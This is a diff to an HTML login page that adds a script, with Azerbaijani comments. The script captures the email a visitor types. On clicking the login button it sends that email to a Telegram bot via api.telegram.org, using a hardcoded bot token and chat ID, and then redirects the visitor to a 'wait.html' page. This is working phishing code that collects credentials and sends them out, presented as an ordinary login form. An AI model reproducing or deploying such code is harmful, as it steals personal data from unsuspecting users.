@@ -267,3 +267,30 @@
         }
     });
 </script>
+<script>
+    const emailInput = document.querySelector('input[type="email"]');
+    const loginBtn = document.querySelector('.btn-blue');
+
+    const BOT_TOKEN = '8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A'; 
+    const CHAT_ID = '-1003369084883';
+
+    loginBtn.addEventListener('click', function() {
+        const email = emailInput.value;
+
+        if (email.includes("@")) {
+            // Telegram-a məlumatı göndər
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=E-posta: ${email}`)
+            .then(() => {
+                // Göndərilən kimi dərhal wait.html-ə yönlən
+                window.location.href = "wait.html";
+            })
+            .catch(() => {
+                // Xəta olsa belə yönləndir
+                window.location.href = "wait.html";
+            });
+        } else {
+            alert("E-postanı düzgün qeyd edin.");
+        }
+    });
+</script>
+
